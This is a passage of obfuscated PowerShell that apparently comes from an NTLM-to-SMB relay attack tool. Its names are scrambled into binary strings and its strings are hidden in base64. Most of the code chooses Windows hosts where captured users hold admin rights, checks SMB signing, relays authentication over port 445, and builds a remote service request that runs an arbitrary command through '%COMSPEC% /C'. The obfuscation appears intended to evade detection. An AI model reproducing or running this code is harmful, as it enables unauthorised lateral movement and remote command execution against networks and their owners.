                        ${00010001101110011} = _10110010000011111 (${01111010001000100} + 4) ${10001101011000100} ${_10010000001111011}
                    }
                    3
                    {
                        ${00110101001100000} = _10110010000011111 (${01111010001000100} + 4) ${10001101011000100} ${_10010000001111011}
                    }
                    4
                    {
                        ${01100111110011011} = _10110010000011111 (${01111010001000100} + 4) ${10001101011000100} ${_10010000001111011}
                    }
                }
                ${01111010001000100} = ${01111010001000100} + ${10001101011000100} + 4
                ${00011101110001011} = ${_10010000001111011}[${01111010001000100}]
                ${10000101000101100}++
            }
            if(${00010001101110011} -and ${01100111110011011} -and !${10001101011100010}.domain_mapping_table.${00010001101110011} -and ${00010001101110011} -ne ${01100111110011011})
            {
                ${10001101011100010}.domain_mapping_table.Add(${00010001101110011},${01100111110011011})
                ${10001101011100010}.output_queue.Add("[+] [$(Get-Date -format s)] Domain mapping added for ${00010001101110011} to ${01100111110011011}") > $null
            }
            for(${10000101000101100} = 0;${10000101000101100} -lt ${10001101011100010}.enumerate.Count;${10000101000101100}++)
            {
                if(${10001101011100010}.enumerate[${10000101000101100}].IP -eq $target -and !${10001101011100010}.enumerate[${10000101000101100}].Hostname)
                {
                    ${10001101011100010}.enumerate[${10000101000101100}].Hostname = ${00110101001100000}
                    ${10001101011100010}.enumerate[${10000101000101100}]."DNS Domain" = ${01100111110011011}
                    ${10001101011100010}.enumerate[${10000101000101100}]."netBIOS Domain" = ${00010001101110011}
                    break
                }
            }
        }
        return ${10010001111000000}
    }
    function _01100000011010110
    {
        param (${_10000101001111101},${_01011010110001110})
        function _10110000001110010
        {
            param ($target)
            try
            {     
                ${01000110000011110} = New-Object System.Net.Sockets.TCPClient
                ${10101000100110101} = ${01000110000011110}.BeginConnect($target,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA0ADUA'))),$null,$null)
                ${10111001110100100} = ${10101000100110101}.AsyncWaitHandle.WaitOne(100,$false)
                ${01000110000011110}.Close()
                if(${10111001110100100})
                {
                    ${00110001011011101} = $true
                }
                else
                {
                    ${00110001011011101} = $false    
                }
                for(${10000101000101100} = 0;${10000101000101100} -lt ${10001101011100010}.enumerate.Count;${10000101000101100}++)
                {
                    if(${10001101011100010}.enumerate[${10000101000101100}].IP -eq $target)
                    {
                        ${01100011000100110} = ${10000101000101100}
                        break
                    }
                }
                if(${01100011000100110} -and ${10001101011100010}.enumerate[${01100011000100110}].IP -eq $target)
                {
                    ${10001101011100010}.enumerate[${01100011000100110}]."SMB Server" = ${00110001011011101}
                    ${10001101011100010}.enumerate[${01100011000100110}]."Targeted" = $(Get-Date -format s)
                }
                else
                {
                    ${10001101011100010}.enumerate.Add((_00000101010001111 -_01010101101100010 $target -_01000101110000111 ${00110001011011101} -_00110000101101110 $(Get-Date -format s))) > $null
                }
                return ${10111001110100100}
            }
            catch 
            {
                return $false
            }
        }
        function _01000100101111010
        {
            param ($Target)
            ${_10010010110001100} = New-Object System.Net.Sockets.TCPClient
            ${_10010010110001100}.Client.ReceiveTimeout = 60000
            ${_10010010110001100}.Connect($target,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA0ADUA'))))
            try
            {
                ${00001111100000001} = ${_10010010110001100}.GetStream()
                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAUwBNAEIA')))
                ${10111110001011100} = New-Object System.Byte[] 1024
            }
            catch
            {
                ${10000111101001011} = $_.Exception.Message
                ${10000111101001011} = ${10000111101001011} -replace "`n",""
                ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] ${10000111101001011} $($_.InvocationInfo.Line.Trim()) stage ${00000100101011111}") > $null
                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
            }
            while(${00000100101011111} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA='))))
            {
                try
                {
                    switch (${00000100101011111})
                    {
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAUwBNAEIA')))
                        {
                            ${10001010110000101} = _10000000011110000 0x72 0x18 0x01,0x48 0xff,0xff ${_10000101001111101} 0x00,0x00       
                            ${10101010100111101} = _10010110010001011 ${_00100111010100111}
                            ${01111111000001111} = _00110101111101011 ${10001010110000101}
                            ${00101010111100011} = _00110101111101011 ${10101010100111101}
                            ${10001001101011001} = _00111011110001101 ${01111111000001111}.Length ${00101010111100011}.Length
                            ${00101101010001101} = _00110101111101011 ${10001001101011001}
                            ${00101010111110011} = ${00101101010001101} + ${01111111000001111} + ${00101010111100011}
                            ${00001111100000001}.Write(${00101010111110011},0,${00101010111110011}.Length) > $null
                            ${00001111100000001}.Flush()    
                            ${00001111100000001}.Read(${10111110001011100},0,${10111110001011100}.Length) > $null
                            if([System.BitConverter]::ToString(${10111110001011100}[4..7]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBmAC0ANQAzAC0ANABkAC0ANAAyAA=='))))
                            {
                                ${_10111010111010111} = $false
                                ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Negotiated SMB1 not supported") > $null
                                ${10001101011100010}.output_queue.Add("[*] [$(Get-Date -format s)] Trying anonther target") > $null
                                ${_10010010110001100}.Close()
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                            }
                            else
                            {
                                ${_10111010111010111} = $true
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAUwBNAEIAMgA=')))
                            }
                            if($target -and [System.BitConverter]::ToString(${10111110001011100}[70]) -eq '03')
                            {        
                                ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Signing is required on $target") > $null
                                ${10001101011100010}.output_queue.Add("[*] [$(Get-Date -format s)] Trying another target") > $null
                                ${_01011000111001010} = $true
                                ${_10010010110001100}.Close()
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                            }
                            else
                            {
                                ${_01011000111001010} = $false    
                            }
                        }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAUwBNAEIAMgA=')))
                        { 
                            ${01011110000111110} = 0x00,0x00,0x00,0x00
                            ${_10110110010000000} = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                            ${10011111011010000} = 1
                            ${00110000000111010} = _01101011100000110 0x00,0x00 0x00,0x00 $false ${10011111011010000} ${_10000101001111101} ${01011110000111110} ${_10110110010000000}  
                            ${00010110001011100} = _00100101100101000
                            ${01111101100001011} = _00110101111101011 ${00110000000111010}
                            ${10010110001100010} = _00110101111101011 ${00010110001011100}
                            ${10001001101011001} = _00111011110001101 ${01111101100001011}.Length ${10010110001100010}.Length
                            ${00101101010001101} = _00110101111101011 ${10001001101011001}
                            ${00101010111110011} = ${00101101010001101} + ${01111101100001011} + ${10010110001100010}
                            ${00001111100000001}.Write(${00101010111110011},0,${00101010111110011}.Length) > $null
                            ${00001111100000001}.Flush()    
                            ${00001111100000001}.Read(${10111110001011100},0,${10111110001011100}.Length) > $null
                            ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                            ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Grabbing challenge for relay from $target") > $null
                        }
                    }
                }
                catch
                {
                    ${10000111101001011} = $_.Exception.Message
                    ${10000111101001011} = ${10000111101001011} -replace "`n",""
                    ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] ${10000111101001011} $($_.InvocationInfo.Line.Trim()) stage ${00000100101011111}") > $null
                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                }
            }
            return ${_10010010110001100},${_10111010111010111},${_01011000111001010}
        }
        function _00100010000110110
        {
            param([Array]${_01111001000100001},[Int]${_00000111101110000},[String]${_00111011000100001})
            ${00001101001110101} = Get-Date
            for(${10000101000101100} = 0;${10000101000101100} -lt ${10001101011100010}.enumerate.Count;${10000101000101100}++)
            {
                if(!${10001101011100010}.enumerate[${10000101000101100}].IP -or ${10001101011100010}.enumerate[${10000101000101100}].IP -eq ${_01011010110001110} -or ${10001101011100010}.enumerate[${10000101000101100}].Signing -or ${10001101011100010}.enumerate[${10000101000101100}]."SMB2.1" -eq $false -or 
                (${10001101011100010}.enumerate[${10000101000101100}]."SMB Server" -eq $false -and (New-TimeSpan ${10001101011100010}.enumerate[${10000101000101100}].Targeted ${00001101001110101}).Minutes -lt $TargetRefresh))
                {
                    if(${10001101011100010}.enumerate[${10000101000101100}].IP)
                    {
                        ${10111101011001110} += @(${10001101011100010}.enumerate[${10000101000101100}].IP)
                    }
                }
            }
            if(${_01111001000100001} -and ${10111101011001110})
            {
                ${_01111001000100001} = diff -ReferenceObject ${_01111001000100001} -DifferenceObject ${10111101011001110} -PassThru | ? {$_.SideIndicator -eq "<="}
                ${10100001011001010} = ${10001101011100010}.session
                if(${_01111001000100001} -and ${10001101011100010}.relay_history_table.${_01011010110001110} -and
                (diff -ReferenceObject ${_01111001000100001} -DifferenceObject ${10001101011100010}.relay_history_table.${_01011010110001110} | ? {$_.SideIndicator -eq "<="}))
                {
                    [Array]${_01111001000100001} = diff -ReferenceObject ${_01111001000100001} -DifferenceObject ${10001101011100010}.relay_history_table.${_01011010110001110} -PassThru | ? {$_.SideIndicator -eq "<="}
                }
                elseif(${_01111001000100001} -and (${10100001011001010} | ? {$_.Status}))
                {
                    ${01011011010001100} = ${_01111001000100001}
                    ${_01111001000100001} = @()
                    foreach(${00101000000001011} in ${01011011010001100})
                    {
                        $sessions = @(${10100001011001010} | ? {$_.Target -eq ${00101000000001011} -and $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG4AbgBlAGMAdABlAGQA')))})
                        if($sessions -and $sessions.Count -lt ${_00000111101110000})
                        {
                            ${_01111001000100001} += ${00101000000001011}
                        }
                        elseif(${_00111011000100001})
                        {
                            $sessions = @(${10100001011001010} | ? {$_.Target -eq ${00101000000001011} -and $_.Initiator -eq ${_00111011000100001} -and $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG4AbgBlAGMAdABlAGQA')))})
                            if($sessions -and $sessions.Count -lt ${_00000111101110000})
                            {
                                ${_01111001000100001} += ${00101000000001011}
                            }
                        }
                    }
                    if(!${_01111001000100001})
                    {
                        foreach(${00101000000001011} in ${01011011010001100})
                        {
                            $sessions = @(${10100001011001010} | ? {$_.Target -eq ${00101000000001011} -and $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAYwBvAG4AbgBlAGMAdABlAGQA')))})
                            if($sessions)
                            {
                                ${_01111001000100001} += ${00101000000001011}
                            }
                        }
                    }
                }
            }
            if(${_01111001000100001} -and ${10001101011100010}.target_list)
            {
                ${_01111001000100001} = diff -ReferenceObject ${_01111001000100001} -DifferenceObject ${10001101011100010}.target_list -ExcludeDifferent -IncludeEqual -PassThru
            }
            ${10000101000101100} = 0
            ${00000000011010010} = @()
            while(!$target -and ${10000101000101100} -lt ${_01111001000100001}.Count)
            {
                ${10000101000101100}++
                if(${_01111001000100001}.Count -eq 1)
                {
                    $target = ${_01111001000100001}[0]
                }
                else
                {
                    ${01001111000000000} = 0..(${_01111001000100001}.Count - 1)
                    ${00001000100111011} = ${01001111000000000} | ? {${00000000011010010} -notcontains $_}
                    if(${00001000100111011})
                    {
                        ${01101000111000110} = Get-Random -InputObject ${00001000100111011}
                        ${00000000011010010} += ${01101000111000110}
                        $target = ${_01111001000100001}[${01101000111000110}]
                    }
                }
                if($target -eq ${_01011010110001110})
                {
                    $target = $null
                }
                if($target)
                {
                    ${10111001110100100} = _10110000001110010 $target
                    if(${10111001110100100})
                    {
                        ${01000000101100110} = _01000100101111010 $target
                        ${_10010010110001100} = ${01000000101100110}[0]
                        ${_10111010111010111} = ${01000000101100110}[1]
                        ${_01011000111001010} = ${01000000101100110}[2]
                        ${00110001011011101} = $true
                        for(${10000101000101100} = 0;${10000101000101100} -lt ${10001101011100010}.enumerate.Count;${10000101000101100}++)
                        {
                            if(${10001101011100010}.enumerate[${10000101000101100}].IP -eq $target)
                            {
                                ${01100011000100110} = ${10000101000101100}
                                break
                            }
                        }
                        ${10001101011100010}.enumerate[${01100011000100110}]."SMB2.1" = ${_10111010111010111}
                        ${10001101011100010}.enumerate[${01100011000100110}].Signing = ${_01011000111001010}
                        ${10001101011100010}.enumerate[${01100011000100110}]."SMB Server" = ${00110001011011101}
                        ${10001101011100010}.enumerate[${01100011000100110}]."Targeted" = $(Get-Date -format s)
                        if(!${_10111010111010111} -and ${_01011000111001010})
                        {
                            $target = $null
                        }
                    }
                    else
                    {
                        $target = $null    
                    }
                }
            }
            return ${_10010010110001100},$target
        }
        if(${10001101011100010}.target_list.Count -gt 1 -or (!${10001101011100010}.target_list -and ${10001101011100010}.enumerate))
        {
            ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Searching for a target") > $null
        }
        try
        {
            ${_01111001000100001} = $null
            $target = $null
            for(${10000101000101100} = 0;${10000101000101100} -lt ${10001101011100010}.enumerate.Count;${10000101000101100}++)
            {
                if(${10001101011100010}.enumerate[${10000101000101100}].IP -eq ${_01011010110001110} -and ${10001101011100010}.enumerate[${10000101000101100}].Sessions)
                {
                    [Array]${10100101001111100} = ${10001101011100010}.enumerate[${10000101000101100}].Sessions
                    break
                }
            }
            ${10100101001111100} = ${10100101001111100} | sort {Get-Random}
            if(${10100101001111100})
            {
                foreach($session in ${10100101001111100})
                {
                    for(${10000101000101100} = 0;${10000101000101100} -lt ${10001101011100010}.enumerate.Count;${10000101000101100}++)
                    {
                        if(${10001101011100010}.enumerate[${10000101000101100}]."Administrator Users" -contains $session -and ${10001101011100010}.enumerate[${10000101000101100}].IP)
                        {
                            ${_01111001000100001} += @(${10001101011100010}.enumerate[${10000101000101100}].IP)
                        }
                    }
                    if(${_01111001000100001})
                    {
                        ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Administrator group match found for session $session on:") > $null
                        ${10001101011100010}.output_queue.Add((${_01111001000100001} -join ",")) > $null
                        ${01000111111111010} = _00100010000110110 ${_01111001000100001} $SessionLimitPriv
                        ${_10010010110001100} = ${01000111111111010}[0]
                        $target = ${01000111111111010}[1]
                    }
                }
            }
            if(${10100101001111100} -and !${_01111001000100001} -and !$target)
            {
                function _00010000100000111
                {
                    param($session)
                    ${01101111010010001} = @()
                    ${01010010100010010} = ${10001101011100010}.group_table.keys
                    foreach(${00111010101100001} in ${01010010100010010})
                    {
                        if(${10001101011100010}.group_table.${00111010101100001} -contains $session)
                        {
                            ${01101111010010001} += ${00111010101100001}
                        }
                    }
                    for(${10000101000101100}=0;${10000101000101100} -lt ${01101111010010001}.Count;${10000101000101100}++)
                    {
                        foreach(${00111010101100001} in ${01010010100010010})
                        {
                            if(${10001101011100010}.group_table.${00111010101100001} -contains ${01101111010010001}[${10000101000101100}])
                            {
                                ${01101111010010001} += ${00111010101100001}
                            }
                        }
                    }
                    return ${01101111010010001}
                }
                ${00100101000111001} = @()
                ${_01111001000100001} = @()
                foreach($session in ${10100101001111100})
                {
                    ${00100101000111001} += _00010000100000111 $session
                }
                if(${00100101000111001})
                {
                    foreach(${00111010101100001} in ${00100101000111001})
                    {
                        for(${10000101000101100} = 0;${10000101000101100} -lt ${10001101011100010}.enumerate.Count;${10000101000101100}++)
                        {
                            if(${10001101011100010}.enumerate[${10000101000101100}]."Administrator Groups" -contains ${00111010101100001} -and ${10001101011100010}.enumerate[${10000101000101100}].IP)
                            {
                                ${_01111001000100001} += @(${10001101011100010}.enumerate[${10000101000101100}].IP)
                            }
                        }
                        if(${_01111001000100001})
                        {
                            ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Administrator group nested match found for ${00111010101100001} from session $session on:") > $null
                            ${10001101011100010}.output_queue.Add((${_01111001000100001} -join ",")) > $null
                            ${01000111111111010} = _00100010000110110 ${_01111001000100001} $SessionLimitPriv
                            ${_10010010110001100} = ${01000111111111010}[0]
                            $target = ${01000111111111010}[1]
                        }
                    }
                }
            }
            if(!${_01111001000100001} -and !$target -and ${_01011010110001110})
            {
                for(${10000101000101100} = 0;${10000101000101100} -lt ${10001101011100010}.enumerate.Count;${10000101000101100}++)
                {
                    if(${10001101011100010}.enumerate[${10000101000101100}].NetSession -contains ${_01011010110001110})
                    {
                        ${_01111001000100001} += @(${10001101011100010}.enumerate[${10000101000101100}].IP)
                    }
                }
                if(${_01111001000100001})
                {
                    ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] NetSession IP match found for ${_01011010110001110} on:") > $null
                    ${10001101011100010}.output_queue.Add((${_01111001000100001} -join ",")) > $null
                    ${01000111111111010} = _00100010000110110 ${_01111001000100001} $SessionLimitUnpriv
                    ${_10010010110001100} = ${01000111111111010}[0]
                    $target = ${01000111111111010}[1]
                }
            }
            if(!${_01111001000100001} -and !$target)
            {
                for(${10000101000101100} = 0;${10000101000101100} -lt ${10001101011100010}.enumerate.Count;${10000101000101100}++)
                {
                    if(${10001101011100010}.enumerate[${10000101000101100}].Shares)
                    {
                        ${_01111001000100001} += @(${10001101011100010}.enumerate[${10000101000101100}].IP)
                    }
                }
                if(${_01111001000100001})
                {
                    ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Searching within the following list of systems hosting custom shares:") > $null
                    ${10001101011100010}.output_queue.Add((${_01111001000100001} -join ",")) > $null
                    ${01000111111111010} = _00100010000110110 ${_01111001000100001} $SessionLimitShare ${_01011010110001110}
                    ${_10010010110001100} = ${01000111111111010}[0]
                    $target = ${01000111111111010}[1]
                }
            }
            if(!$target -and $TargetMode -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAG4AZABvAG0A'))))
            {
                if(${10001101011100010}.target_list.Count -gt 1)
                {
                    ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Selecting a random target") > $null
                }
                if(${10001101011100010}.target_list)
                {
                    ${01000111111111010} = _00100010000110110 ${10001101011100010}.target_list $SessionLimitUnpriv
                }
                else
                {
                    ${_01111001000100001} = @()
                    $inveigh_enumerate.Count = ${10001101011100010}.enumerate.Count
                    for(${10000101000101100}=0; ${10000101000101100} -lt $hostname_encoded.Count; ${10000101000101100}++)
                    {
                        if($inveigh_enumerate[${10000101000101100}].Hostname)
                        {
                            ${_01111001000100001} += $inveigh_enumerate[${10000101000101100}].Hostname
                        }
                        elseif($inveigh_enumerate[${10000101000101100}].IP)
                        {
                            ${_01111001000100001} += $inveigh_enumerate[${10000101000101100}].IP
                        }
                    }
                    ${01000111111111010} = _00100010000110110 ${_01111001000100001} $SessionLimitUnpriv
                }
                ${_10010010110001100} = ${01000111111111010}[0]
                $target = ${01000111111111010}[1]
            }
            if($target -and !${10001101011100010}.relay_history_table.${_01011010110001110})
            {
                ${10001101011100010}.relay_history_table.Add(${_01011010110001110},[Array]$target)
            }
            elseif($target -and ${10001101011100010}.relay_history_table.${_01011010110001110} -notcontains $target)
            {
                ${10001101011100010}.relay_history_table.${_01011010110001110} += $target
            }
        }
        catch
        {
            ${10000111101001011} = $_.Exception.Message
            ${10000111101001011} = ${10000111101001011} -replace "`n",""
            ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] ${10000111101001011} $($_.InvocationInfo.Line.Trim())") > $null
        }
        return ${_10010010110001100},$target
    }
    function _01111100000000000
    {
        param (${_10010010110001100},${_00011101001001110},${_00100111010100111},${_00000000111100011})
        try
        {
            ${00001111100000001} = ${_10010010110001100}.GetStream()
            ${10111110001011100} = New-Object System.Byte[] 1024
            ${10011111011010000} = 2
            ${01011110000111110} = 0x00,0x00,0x00,0x00
            ${_10110110010000000} = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
            ${00110000000111010} = _01101011100000110 0x01,0x00 0x1f,0x00 $false ${10011111011010000} ${_00000000111100011} ${01011110000111110} ${_10110110010000000}
            ${00110100010101011} = _01001111110101010 0x07,0x82,0x08,0xa2 ${_00011101001001110}[(${_00011101001001110}.Length-8)..(${_00011101001001110}.Length)]
            ${01111101100001011} = _00110101111101011 ${00110000000111010}
            ${10011111001110111} = _00110101111101011 ${00110100010101011}       
            ${00010110001011100} = _10010001111011001 ${10011111001110111}
            ${10010110001100010} = _00110101111101011 ${00010110001011100}
            ${10001001101011001} = _00111011110001101 ${01111101100001011}.Length ${10010110001100010}.Length
            ${00101101010001101} = _00110101111101011 ${10001001101011001}
            ${00101010111110011} = ${00101101010001101} + ${01111101100001011} + ${10010110001100010}
            ${00001111100000001}.Write(${00101010111110011},0,${00101010111110011}.Length) > $null
            ${00001111100000001}.Flush()    
            ${00001111100000001}.Read(${10111110001011100},0,${10111110001011100}.Length) > $null
        }
        catch
        {
            ${10000111101001011} = $_.Exception.Message
            ${10000111101001011} = ${10000111101001011} -replace "`n",""
            ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] ${10000111101001011} $($_.InvocationInfo.Line.Trim())") > $null
        }
        return ${10111110001011100}
    }
    function _00001011111001101
    {
        param (${_10010010110001100},${_00011101001001110},${_00100111010100111},${_00010000111001010},${_10110110010000000},${_00000000111100011})
        try
        {
            ${10111110001011100} = New-Object System.Byte[] 1024
            if(${_10010010110001100})
            {
                ${00101111110100100} = ${_10010010110001100}.GetStream()
            }
            ${10011111011010000} = 3
            ${01011110000111110} = 0x00,0x00,0x00,0x00
            ${00110000000111010} = _01101011100000110 0x01,0x00 0x1f,0x00 $false ${10011111011010000} ${_00000000111100011} ${01011110000111110} ${_10110110010000000}
            ${00010100101100001} = _10000011000110001 ${_00011101001001110}
            ${01111101100001011} = _00110101111101011 ${00110000000111010}
            ${00110101100000110} = _00110101111101011 ${00010100101100001}        
            ${00010110001011100} = _10010001111011001 ${00110101100000110}
            ${10010110001100010} = _00110101111101011 ${00010110001011100}
            ${10001001101011001} = _00111011110001101 ${01111101100001011}.Length ${10010110001100010}.Length
            ${00101101010001101} = _00110101111101011 ${10001001101011001}
                ${00101010111110011} = ${00101101010001101} + ${01111101100001011} + ${10010110001100010}
            ${00101111110100100}.Write(${00101010111110011},0,${00101010111110011}.Length) > $null
            ${00101111110100100}.Flush()
            ${00101111110100100}.Read(${10111110001011100},0,${10111110001011100}.Length) > $null
            if((${_00100111010100111} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA='))) -and [System.BitConverter]::ToString(${10111110001011100}[9..12]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA==')))) -or (${_00100111010100111} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA='))) -and [System.BitConverter]::ToString(${10111110001011100}[12..15]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA==')))))
            {
                ${10000001100000110} = $false
                ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] ${10100100100010110} to SMB relay authentication successful for ${01001111001000100} on $Target") > $null              
            }
            else
            {
                for(${10000101000101100} = 0;${10000101000101100} -lt ${10001101011100010}.enumerate.Count;${10000101000101100}++)
                {
                    if(${10001101011100010}.enumerate[${10000101000101100}].IP -eq $target)
                    {
                        ${01100011000100110} = ${10000101000101100}
                        break
                    }
                }
                ${01001111110100000} = ${10001101011100010}.enumerate[${01100011000100110}].Hostname
                ${10101100101110010} = ${10001101011100010}.enumerate[${01100011000100110}]."DNS Domain"
                if($FailedLoginStrict -eq 'Y' -or (${10001110110010100} -and ((!${01001111110100000} -or !${10101100101110010}) -or (${01001111110100000} -and ${10101100101110010} -and ${01001111110100000} -ne ${10101100101110010}))))
                {
                    if(!${10001101011100010}.relay_failed_login_table.ContainsKey(${01001111001000100}))
                    {
                        ${10001101011100010}.relay_failed_login_table.Add(${01001111001000100},[Array]$target)
                    }
                    else
                    {
                        ${10001101011100010}.relay_failed_login_table.${01001111001000100} += $target
                    }
                }
                ${10000001100000110} = $true
                ${_10010010110001100}.Close()
                ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] ${10100100100010110} to SMB relay authentication failed for ${01001111001000100} on $Target") > $null
            }
        }
        catch
        {
            ${10000111101001011} = $_.Exception.Message
            ${10000111101001011} = ${10000111101001011} -replace "`n",""
            ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] ${10000111101001011} $($_.InvocationInfo.Line.Trim())") > $null
            ${10000001100000110} = $true
        }
        return ${10000001100000110}
    }
    function _00001000001001111
    {
        param ([Byte[]]${_00111100010011010})
        if([System.BitConverter]::ToString(${_00111100010011010}) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAzAC0AMAAxAC0AMAAwAC0AMAAwAA=='))))
        {
            ${01110000101110011} = $true
        }
        return ${01110000101110011}
    }
    function _01110111011000100
    {
        param (${_10010010110001100},${_00100111010100111},${_00010000111001010},${_10110110010000000},${_00000000111100011},${_10001111100011011})
        ${10111110001011100} = New-Object System.Byte[] 1024
        if(!$Service)
        {
            ${00000110011111000} = [String]::Join($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0A'))),(1..20 | %{$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0ALQA='))) -f (Get-Random -Minimum 65 -Maximum 90)}))
            ${01001011011010100} = ${00000110011111000} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
            ${01001011011010100} = ${01001011011010100}.Substring(0,${01001011011010100}.Length - 1)
            ${01001011011010100} = ${01001011011010100}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
            ${01001011011010100} = New-Object System.String (${01001011011010100},0,${01001011011010100}.Length)
            ${00000110011111000} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAA==')))
            ${01011010010011111} = ${00000110011111000}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}   
        }
        else
        {
            ${01001011011010100} = $Service
            ${01011010010011111} = [System.Text.Encoding]::Unicode.GetBytes($Service)
            if([Bool](${01001011011010100}.Length % 2))
            {
                ${01011010010011111} += 0x00,0x00
            }
            else
            {
                ${01011010010011111} += 0x00,0x00,0x00,0x00
            }
        }
        ${10110100110011010} = [System.BitConverter]::GetBytes(${01001011011010100}.Length + 1)
        $Command = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JQBDAE8ATQBTAFAARQBDACUAIAAvAEMAIAAiAA=='))) + $Command + "`""
        [System.Text.Encoding]::UTF8.GetBytes($Command) | %{${01111010101100000} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0ALQAwADAALQA='))) -f $_}
        if([Bool]($Command.Length % 2))
        {
            ${01111010101100000} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAA==')))
        }
        else
        {
            ${01111010101100000} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA==')))
        }    
        ${00100010100101100} = ${01111010101100000}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}  
        ${01111101111101000} = [System.BitConverter]::GetBytes(${00100010100101100}.Length / 2)
        ${00101100011010111} = "\\" + $Target + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAFAAQwAkAA==')))
        ${00110100011000011} = [System.Text.Encoding]::Unicode.GetBytes(${00101100011010111})
        ${00011110010010101} = 0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,0x00,0x10,0x03
        ${00001111100000001} = ${_10010010110001100}.GetStream()
        ${00110111010000001} = 4256
        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AA==')))
        ${10011111011010000} =  ${10001101011100010}.session_message_ID_table[${10001101011100010}.session_count]
        while (${00000100101011111} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA='))))
        {
            try
            {
                switch (${00000100101011111})
                {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAEEAYwBjAGUAcwBzAA==')))
                    {
                        if([System.BitConverter]::ToString(${10111110001011100}[128..131]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))) -and [System.BitConverter]::ToString(${10111110001011100}[108..127]) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                        {
                            ${01100001000000011} = ${10111110001011100}[108..127]
                            ${10000111110001010} = _01101100111100111 ${01100001000000011} ${01011010010011111} ${10110100110011010} ${00100010100101100} ${01111101111101000}
                            ${00111011100110101} = _00110101111101011 ${10000111110001010}
                            ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] ${01001111001000100} has command execution privilege on $target") > $null
